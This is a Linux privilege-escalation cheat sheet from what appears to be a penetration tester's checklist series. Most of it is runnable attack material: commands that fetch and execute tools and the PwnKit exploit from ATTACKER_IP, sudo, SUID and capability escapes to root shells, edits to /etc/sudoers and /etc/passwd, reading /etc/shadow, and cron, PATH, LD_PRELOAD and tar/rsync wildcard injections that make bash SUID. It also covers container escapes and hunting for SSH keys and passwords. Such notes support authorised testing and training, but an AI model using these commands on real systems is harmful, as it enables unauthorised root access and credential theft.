---
tags: [got-shell-linux, linux, privesc, sudo, suid, cron, capabilities, path-hijack, ld-preload, wildcard]
---

# Linux Privilege Escalation

> Run linpeas first, then work through this list manually in parallel.

> **Chains:** Internal port found (ss -anp) → [07_pivoting.md](./07_pivoting.md) | Creds found → [00_master_checklist.md Phase 4](./00_master_checklist.md) — spray | Root obtained → [00_master_checklist.md Phase 7](./00_master_checklist.md) — dump & pivot

---

## Upgrade Shell First

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
# Then:
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 38 cols 120
```

---

## Automated Tools

```bash
# Transfer and run linpeas
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | tee /tmp/lp.out

# pspy (watch processes without root)
wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy

# LinEnum
wget http://ATTACKER_IP:8000/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh | tee /tmp/le.out
```

---

## Quick Triage (run these immediately)

```bash
id && whoami && hostname

sudo -l

find / -perm -4000 -type f 2>/dev/null          # SUID

getcap -r / 2>/dev/null                         # Capabilities

cat /etc/crontab && ls -la /etc/cron.*          # Cron

cat /etc/passwd | grep -v nologin | grep -v false

cat ~/.bash_history 2>/dev/null

ss -anp                                          # Internal ports
```

---

## 1 — Sudo

```bash
sudo -l

# CVE-2019-14287 — requires sudo < 1.8.28 AND a (ALL) sudoers entry
sudo -V
# If version < 1.8.28 and sudo -l shows (ALL) on any binary:
sudo -u#-1 /bin/bash
```

If `sudo -l` shows binaries → check GTFOBins: https://gtfobins.github.io/

Common exploitable sudo entries:

```bash
# vim
sudo vim -c '!bash'

# python
sudo python -c 'import os; os.system("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (old)
sudo nmap --interactive
nmap> !sh

# env
sudo env /bin/bash

# less/more
sudo less /etc/hosts
!/bin/bash

# tee (write to file as root)
echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```

---

## 2 — SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

Common exploitable SUIDs → GTFOBins:

```bash
# bash (should not be SUID but sometimes is)
/bin/bash -p

# python
python -c 'import os; os.execl("/bin/sh","sh","-p")'

# cp (overwrite /etc/passwd or /etc/sudoers)
openssl passwd -1 -salt abc password123
echo 'newroot:$1$abc$...:0:0:root:/root:/bin/bash' | tee -a /etc/passwd
su newroot

# find
find . -exec /bin/sh -p \; -quit

# vim
vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

---

## 3 — Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability               | Exploit                                                            |
| ------------------------ | ------------------------------------------------------------------ |
| `cap_setuid+ep`          | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`     |
| `cap_net_raw+ep`         | Packet sniffing                                                    |
| `cap_dac_read_search+ep` | `perl -e 'use POSIX; open(my $fh,"<","/etc/shadow"); print <$fh>'` |

```bash
# Python with cap_setuid
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# vim with cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh")'
```

---

## 4 — Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ && cat /etc/cron.d/*
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
crontab -l
cat /var/log/syslog | grep cron 2>/dev/null
cat /var/log/cron.log 2>/dev/null

# Watch for crons running
/tmp/pspy64
```

Exploitation:

```bash
# If script is world-writable
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh

# If script path is writable (PATH abuse)
echo '#!/bin/bash' > /writable/path/scriptname
echo 'chmod +s /bin/bash' >> /writable/path/scriptname
chmod +x /writable/path/scriptname
# Wait for cron to run, then:
/bin/bash -p
```

---

## 5 — Writable /etc/passwd

```bash
ls -la /etc/passwd
# If writable:
openssl passwd -1 -salt hacker hacker123
# Add to /etc/passwd:
echo 'r00t:$1$hacker$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su r00t
```

---

## 6 — NFS with no_root_squash

```bash
# On target
cat /etc/exports | grep no_root_squash

# On attacker (as root)
showmount -e $TARGET
sudo mount -t nfs $TARGET:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target
/share/bash -p
```

---

## 7 — Kernel Exploits

```bash
uname -a
cat /etc/os-release
searchsploit "linux kernel $(uname -r)"
searchsploit linux 5.8 local privilege escalation

# Common exploits
# Dirty Cow (CVE-2016-5195) — kernel < 4.8.3
# overlayfs (CVE-2021-3493) — Ubuntu specific
# PwnKit (CVE-2021-4034) — pkexec SUID
# DirtyPipe (CVE-2022-0847) — kernel 5.8-5.16
```

```bash
# PwnKit (most reliable modern Linux privesc)
wget http://ATTACKER_IP:8000/PwnKit -O /tmp/pwn && chmod +x /tmp/pwn && /tmp/pwn

# DirtyPipe
gcc -o /tmp/dpipe exploit.c && /tmp/dpipe /usr/bin/sudo
```

---

## 8 — Credential Hunting

```bash
# Config files with passwords
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -li "password" 2>/dev/null
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null
find / -name "wp-config.php" 2>/dev/null | xargs cat 2>/dev/null

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.python_history
cat /root/.bash_history 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Hardcoded in scripts
grep -rn "password" /var/www/ 2>/dev/null | grep -v ".pyc" | head -30
grep -rn "password" /opt/ 2>/dev/null | head -20
```

---

## 9 — Internal Services (port forwarding)

```bash
ss -anp
netstat -tulnp

# If something listening on 127.0.0.1:PORT not accessible from outside
# → see 07_pivoting.md for port forwarding
```

Common internal services worth targeting:

- 3306 (MySQL) with no remote auth
- 8080 (internal web app)
- 27017 (MongoDB unauthenticated)
- 6379 (Redis unauthenticated)

---

## 10 — Docker / LXC Escape

```bash
# Check if in container
cat /proc/1/cgroup | grep docker
ls /.dockerenv

# Check if in lxc
id  # look for lxc group
cat /proc/1/environ | tr '\0' '\n'

# Escape via mounted docker socket
find / -name docker.sock 2>/dev/null
docker -H unix:///path/to/docker.sock run -it --rm -v /:/mnt ubuntu chroot /mnt bash

# If in privileged container
fdisk -l
mkdir /mnt/escape && mount /dev/sda1 /mnt/escape
```

---

## 11 — PATH Hijacking

**Look for:** A privileged script, cron job, or SUID binary that calls another program by name only (no full path). If you control a directory that appears earlier in `$PATH`, you can plant a malicious binary with that name.

```bash
# Check what's in PATH
echo $PATH

# Look for relative calls in cron scripts
cat /etc/crontab && cat /etc/cron.d/*
# e.g. script.sh contains: "service apache2 restart" — calls 'service' without /usr/sbin/service

# Check SUID binaries for relative calls (strings shows what they exec)
strings /usr/bin/suid_binary | grep -v "^/"
# If you see bare names like "backup", "cp", "cat" — exploitable if you control a PATH dir

# Exploit: add your controlled dir to the front of PATH, plant malicious binary
export PATH=/tmp:$PATH
cat > /tmp/service << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/service
# Trigger the cron job or SUID binary, then: /bin/bash -p
```

**What to look for:** World-writable directories already in PATH (`/tmp`, `/dev/shm`), writable dirs owned by you. Check that the cron runs as root.
**Google:** `Linux PATH hijacking privilege escalation` / `SUID binary PATH hijacking`

---

## 12 — LD_PRELOAD (via sudo)

**Look for:** `sudo -l` output contains `env_keep+=LD_PRELOAD`.

```bash
sudo -l
# Look for line like: env_keep += LD_PRELOAD

# Write a malicious shared library
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles

# Run any allowed sudo binary with LD_PRELOAD pointing to your library
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/find
```

**Why it works:** `env_keep+=LD_PRELOAD` tells sudo to preserve that variable. The dynamic linker loads your library first as root and calls `_init()` before main() runs.

---

## 13 — Wildcard Injection

**Look for:** A root cron job or script that calls `tar`, `chown`, `chmod`, or `rsync` with a `*` wildcard in a directory you can write to.

```bash
# Find cron scripts using wildcards
cat /etc/crontab && cat /etc/cron.d/*
# Target lines like:
#   cd /var/backup && tar czf backup.tar.gz *
#   chown root:root /opt/app/*

# --- tar wildcard injection (most common) ---
# If cron runs: cd /var/backup && tar czf backup.tar.gz *
# Files named like tar flags are interpreted as flags, not filenames

echo "" > /var/backup/--checkpoint=1
echo "" > "/var/backup/--checkpoint-action=exec=bash shell.sh"
echo 'chmod +s /bin/bash' > /var/backup/shell.sh
chmod +x /var/backup/shell.sh
# Wait for cron → /bin/bash -p

# --- rsync wildcard injection ---
# If cron runs: rsync -a /opt/backup/* user@host:/remote/
touch '/opt/backup/-e sh shell.sh'
echo 'chmod +s /bin/bash' > /opt/backup/shell.sh
chmod +x /opt/backup/shell.sh
# rsync interprets -e sh shell.sh as flags
```

---

## Decision Tree

```
Got shell as low-priv user
├── sudo -l → anything? → GTFOBins
├── sudo -l → env_keep+=LD_PRELOAD? → section 12 LD_PRELOAD
├── SUID binaries? → GTFOBins
├── Capabilities? → cap_setuid = instant root
├── Writable cron script? → append reverse shell
├── Cron/SUID calls binary without full path? → PATH hijacking (section 11)
├── Cron uses wildcard (*) in writable dir? → wildcard injection (section 13)
├── Writable /etc/passwd? → add root user
├── Running as container? → Docker/LXC escape
├── NFS no_root_squash? → SUID bash via mount
├── Internal port open? → port-forward and attack
├── Credentials in files? → sudo/su/ssh with them
└── Nothing → kernel exploit (last resort)
```
